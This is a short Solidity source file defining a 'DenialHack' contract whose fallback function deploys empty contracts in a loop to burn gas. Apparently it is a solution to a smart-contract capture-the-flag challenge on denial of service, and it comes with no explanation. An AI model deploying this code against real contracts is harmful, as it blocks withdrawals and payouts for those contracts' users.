// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Empty {}

contract DenialHack {
    fallback() external payable {
        while (gasleft() > 2300) {
            new Empty();
        }
    }
}
